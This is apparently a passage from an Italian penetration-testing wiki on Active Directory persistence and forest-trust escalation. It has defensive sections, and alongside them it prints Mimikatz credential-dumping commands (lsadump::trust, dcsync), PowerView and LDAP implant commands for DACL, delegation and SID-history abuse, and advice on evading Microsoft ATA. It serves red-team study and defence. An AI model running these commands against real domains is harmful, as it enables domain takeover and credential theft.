Un **Golden Ticket attack** comporta che un attaccante ottenga l'accesso all'**NTLM hash** dell'account krbtgt in un ambiente Active Directory (AD). Questo account è speciale perché viene utilizzato per firmare tutti i **Ticket Granting Tickets (TGTs)**, essenziali per l'autenticazione nella rete AD.

Una volta che l'attaccante ottiene questo hash, può creare **TGTs** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono simili ai golden tickets forgiati in modo da **bypassare i meccanismi comuni di rilevamento dei golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Avere i certificati di un account o poterli richiedere è un ottimo modo per persistere nell'account dell'utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

Usare certificati permette anche di mantenere la persistenza con privilegi elevati all'interno del dominio:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **gruppi privilegiati** (come Domain Admins e Enterprise Admins) applicando una standard **Access Control List (ACL)** a questi gruppi per prevenire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata; se un attaccante modifica l'ACL di AdminSDHolder per dare pieno accesso a un utente normale, quell'utente ottiene un controllo esteso su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi, permettendo accessi non autorizzati a meno che non venga attentamente monitorata.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account **local administrator**. Ottenendo diritti di admin su tale macchina, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Successivamente è necessaria una modifica del registro per **abilitare l'uso di questa password**, permettendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **concedere** alcune **autorizzazioni speciali** a un **utente** su specifici oggetti di dominio che consentiranno all'utente di **escalare privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** sono usati per **memorizzare** le **permissions** che un **oggetto** ha **su** un altro **oggetto**. Se puoi semplicemente **effettuare** una **piccola modifica** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza bisogno di essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Alterare **LSASS** in memoria per stabilire una **password universale**, concedendo accesso a tutti gli account di dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **clear text** le **credenziali** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** in AD e lo usa per **pushare attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare alcun **log** riguardo le **modifiche**. Hai **bisogno DA** privileges ed essere all'interno del **root domain**.\
Nota che se usi dati errati, appariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo discusso come escalare privilegi se si hanno **sufficienti permessi per leggere le password LAPS**. Tuttavia, queste password possono anche essere usate per **mantenere la persistenza**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera la **Forest** come il confine di sicurezza. Questo implica che **compromettere un singolo dominio potrebbe potenzialmente portare alla compromissione dell'intera Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che permette a un utente di un **domain** di accedere a risorse in un altro **domain**. Fondamentalmente crea un collegamento tra i sistemi di autenticazione dei due domini, permettendo il flusso delle verifiche di autenticazione. Quando i domini configurano una trust, scambiano e conservano chiavi specifiche all'interno dei loro **Domain Controllers (DCs)**, che sono cruciali per l'integrità della trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **trusted domain**, deve prima richiedere un ticket speciale noto come **inter-realm TGT** dal DC del proprio dominio. Questo TGT è crittografato con una **trust key** condivisa che entrambi i domini hanno concordato. L'utente poi presenta questo TGT al **DC del domain trusted** per ottenere un ticket di servizio (**TGS**). Dopo la valida verifica dell'inter-realm TGT da parte del DC trusted, questo emette un TGS, concedendo all'utente l'accesso al servizio.

**Steps**:

1. Un **client computer** in **Domain 1** inizia il processo utilizzando il suo **NTLM hash** per richiedere un **Ticket Granting Ticket (TGT)** al suo **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato con successo.
3. Il client poi richiede un **inter-realm TGT** a DC1, necessario per accedere a risorse in **Domain 2**.
4. L'inter-realm TGT è crittografato con una **trust key** condivisa tra DC1 e DC2 come parte della trust bidirezionale.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2)** di Domain 2.
6. DC2 verifica l'inter-realm TGT usando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server in Domain 2 a cui il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è crittografato con l'hash dell'account del server, per ottenere accesso al servizio in Domain 2.

### Different trusts

È importante notare che **una trust può essere 1 way o 2 ways**. Nella modalità a 2 vie, entrambi i domini si fidano l'uno dell'altro, ma nella relazione di trust **1 way** uno dei domini sarà il **trusted** e l'altro il **trusting** domain. In quest'ultimo caso, **potrai accedere solo alle risorse del trusting domain partendo dal trusted domain**.

Se Domain A trusts Domain B, A è il trusting domain e B è il trusted. Inoltre, in **Domain A**, questa sarebbe una **Outbound trust**; e in **Domain B**, sarebbe una **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Configurazione comune all'interno della stessa forest, dove un domain figlio ha automaticamente una two-way transitive trust con il domain padre. Questo significa che le richieste di autenticazione possono fluire senza problemi tra padre e figlio.
- **Cross-link Trusts**: Note come "shortcut trusts", vengono stabilite tra domain figli per accelerare i processi di referral. In forest complesse, i riferimenti di autenticazione tipicamente devono viaggiare fino alla root della forest e poi scendere al domain di destinazione. Creando cross-links, il percorso si accorcia, cosa particolarmente utile in ambienti geograficamente distribuiti.
- **External Trusts**: Stabilite tra domini differenti e non correlati e sono intrinsecamente non-transitive. Secondo la documentazione Microsoft, le external trusts sono utili per accedere a risorse in un domain fuori dalla forest corrente che non è collegato tramite forest trust. La sicurezza è rafforzata tramite SID filtering con le external trusts.
- **Tree-root Trusts**: Queste trust vengono create automaticamente tra il forest root domain e un nuovo tree root aggiunto. Pur non essendo comuni, le tree-root trusts sono importanti per aggiungere nuovi domain tree a una forest, permettendo loro di mantenere un nome di dominio unico e garantendo la transitive two-way. Maggiori informazioni nella guida Microsoft.
- **Forest Trusts**: Questo tipo di trust è una two-way transitive trust tra due forest root domains, applicando anche SID filtering per migliorare la sicurezza.
- **MIT Trusts**: Queste trust vengono stabilite con domini Kerberos non-Windows compliant con [RFC4120]. Le MIT trusts sono più specializzate e servono per integrare sistemi Kerberos esterni all'ecosistema Windows.

#### Other differences in **trusting relationships**

- Una relazione di trust può anche essere **transitive** (A trusts B, B trusts C, quindi A trusts C) o **non-transitive**.
- Una relazione di trust può essere impostata come **bidirectional trust** (entrambi si fidano reciprocamente) o come **one-way trust** (solo uno si fida dell'altro).

### Attack Path

1. **Enumerare** le relazioni di trusting
2. Verificare se qualche **security principal** (user/group/computer) ha **accesso** a risorse dell'**altro dominio**, magari tramite voci ACE o facendo parte di gruppi dell'altro dominio. Cercare **relazioni across domains** (la trust è stata creata probabilmente per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Compromettere** gli **accounts** che possono **pivotare** attraverso i domini.

Gli attaccanti potrebbero accedere a risorse in un altro dominio tramite tre meccanismi primari:

- **Local Group Membership**: I principal potrebbero essere aggiunti a gruppi locali sulle macchine, come il gruppo “Administrators” su un server, concedendo loro un controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principal possono anche essere membri di gruppi all'interno del dominio esterno. Tuttavia, l'efficacia di questo metodo dipende dalla natura della trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principal potrebbero essere specificati in una **ACL**, in particolare come entità in **ACE** all'interno di una **DACL**, fornendo loro accesso a risorse specifiche. Per chi vuole approfondire i meccanismi di ACLs, DACLs e ACEs, il whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare i foreign security principals nel dominio. Questi saranno utenti/gruppi provenienti da **un dominio/forest esterno**.

Puoi verificare ciò con **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust di dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 trusted keys**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi verificare quale viene utilizzata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalare a Enterprise admin nel dominio child/parent abusando della relazione di trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

È fondamentale capire come può essere sfruttato il Configuration Naming Context (NC). Il Configuration NC funge da repository centrale per i dati di configurazione in una forest di Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) nella forest, e i DC scrivibili mantengono una copia scrivibile del Configuration NC. Per sfruttarlo, è necessario avere i privilegi **SYSTEM su un DC**, preferibilmente un child DC.

**Collegare un GPO al sito del root DC**

Il container Sites del Configuration NC include informazioni sui siti di tutti i computer joined al dominio all'interno della forest AD. Operando con privilegi SYSTEM su qualsiasi DC, un attaccante può collegare GPO ai siti del root DC. Questa azione può compromettere il dominio root manipolando le policy applicate a questi siti.

Per informazioni dettagliate, si può consultare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromettere qualsiasi gMSA nella forest**

Un vettore d'attacco consiste nel mirare a gMSA privilegiati all'interno del dominio. La KDS Root key, essenziale per calcolare le password delle gMSA, è memorizzata nel Configuration NC. Con privilegi SYSTEM su qualsiasi DC è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA nella forest.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attaccante può modificare lo Schema di AD per concedere a qualsiasi utente il controllo completo su tutte le classi. Questo potrebbe portare ad accessi e controllo non autorizzati sui nuovi oggetti AD creati.

Ulteriori letture sono disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 mira al controllo degli oggetti PKI per creare un template di certificato che consente l'autenticazione come qualsiasi utente all'interno della forest. Poiché gli oggetti PKI risiedono nel Configuration NC, compromettere un DC child scrivibile permette di eseguire attacchi ESC5.

Maggiori dettagli sono disponibili in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari privi di ADCS, l'attaccante ha la capacità di predisporre i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Dominio di foresta esterna - One-Way (Inbound) o bidirezionale
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo dominio è trusted** da un dominio esterno che ti assegna **permessi non determinati** su di esso. Dovrai determinare **quali principal del tuo dominio hanno quale accesso sul dominio esterno** e poi provare a sfruttarlo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio di foresta esterna - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **il tuo dominio** sta **concedendo** alcuni **privilegi** a principal provenienti da **domini diversi**.

Tuttavia, quando un **domain is trusted** dal trusting domain, il trusted domain **crea un utente** con un **nome prevedibile** che usa come **password la trusted password**. Ciò significa che è possibile **accedere con un utente del trusting domain per entrare nel trusted domain** per enumerarlo e provare a ottenere ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Un altro modo per compromettere il trusted domain è aspettare su una macchina a cui un **utente del trusted domain può accedere** per effettuare il login via **RDP**. L'attaccante potrebbe quindi iniettare codice nel processo della sessione RDP e **accedere al dominio di origine della vittima** da lì. Inoltre, se la **vittima ha montato il suo hard drive**, dal processo della **sessione RDP** l'attaccante potrebbe salvare **backdoors** nella **cartella di avvio del disco**. Questa tecnica è chiamata **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigazioni per l'abuso dei domain trust

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SIDHistory attraverso i trust tra foreste è mitigato da SID Filtering, che è attivato di default su tutti i trust inter-forest. Questo si basa sull'assunto che i trust intra-forest siano sicuri, considerando la foresta, piuttosto che il dominio, come confine di sicurezza secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: SID Filtering potrebbe interrompere applicazioni e accessi utente, portando alla sua disattivazione occasionale.

### **Selective Authentication:**

- Per i trust inter-forest, l'impiego di Selective Authentication assicura che gli utenti delle due foreste non vengano autenticati automaticamente. Invece, sono richieste autorizzazioni esplicite per permettere agli utenti di accedere ai domini e ai server all'interno del trusting domain o della foresta.
- È importante notare che queste misure non proteggono dallo sfruttamento del writable Configuration Naming Context (NC) né dagli attacchi sull'account di trust.

[**Maggiori informazioni sui domain trusts su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso di AD basato su LDAP da on-host implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Enumerazione LDAP lato implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` risolvono nomi brevi/percorsi OU in DN completi ed esportano gli oggetti corrispondenti.
- `get-object`, `get-attribute`, and `get-domaininfo` estraggono attributi arbitrari (inclusi security descriptors) oltre ai metadati della foresta/dominio da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` espongono candidati per il roasting, impostazioni di delega e descriptor esistenti di [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direttamente da LDAP.
- `get-acl` and `get-writable --detailed` analizzano la DACL per elencare trustee, diritti (GenericAll/WriteDACL/WriteOwner/attribute writes) e l'ereditarietà, fornendo obiettivi immediati per l'escalation di privilegi tramite ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) consentono all'operatore di mettere in staging nuovi principal o machine account ovunque esistano diritti sull'OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` dirottano direttamente i target una volta trovati i diritti di write-property.
- Comandi focalizzati sulle ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` traducono WriteDACL/WriteOwner su qualsiasi oggetto AD in reset di password, controllo della membership di gruppi, o privilegi di DCSync replication senza lasciare artefatti PowerShell/ADSI. I counterpart `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` rendono istantaneamente un utente compromesso Kerberoastable; `add-asreproastable` (UAC toggle) lo marca per AS-REP roasting senza toccare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, flag UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando path d'attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inietta SID privilegiati nello SID history di un principal controllato (vedi [SID-History Injection](sid-history-injection.md)), fornendo un'ereditarietà d'accesso stealth completamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attaccante di spostare asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember`, o `add-spn`.
- Comandi di rimozione strettamente mirati (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) permettono un rapido rollback dopo che l'operatore ha raccolto credenziali o persistenza, minimizzando la telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Scopri di più su come proteggere le credenziali qui.**](../stealing-credentials/credentials-protections.md)

### **Misure difensive per la protezione delle credenziali**

- **Domain Admins Restrictions**: Si raccomanda che i Domain Admins siano autorizzati a effettuare il login solo sui Domain Controller, evitando il loro uso su altri host.
- **Service Account Privileges**: I servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA) per mantenere la sicurezza.
- **Temporal Privilege Limitation**: Per attività che richiedono privilegi DA, la durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit degli Event ID 2889/3074/3075 e poi applicare LDAP signing più LDAPS channel binding su DCs/clients per bloccare tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementare deception significa piazzare trappole, come utenti o computer decoy, con caratteristiche quali password che non scadono o marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o l'aggiunta a gruppi ad alta privilegio.
- Un esempio pratico utilizza strumenti come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Ulteriori informazioni sul deployment di tecniche di deception si trovano su [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Indicatori sospetti includono ObjectSID atipico, logon poco frequenti, date di creazione e basso numero di bad password counts.
- **General Indicators**: Confrontare gli attributi di potenziali oggetti decoy con quelli di oggetti genuini può rivelare incongruenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare tali deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitare l'enumerazione di sessioni sui Domain Controller per prevenire il rilevamento da parte di ATA.
- **Ticket Impersonation**: Utilizzare chiavi **aes** per la creazione dei ticket aiuta a evadere il rilevamento evitando il downgrade a NTLM.
- **DCSync Attacks**: Si consiglia di eseguire da un non-Domain Controller per evitare il rilevamento ATA, poiché l'esecuzione diretta da un Domain Controller genererà alert.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
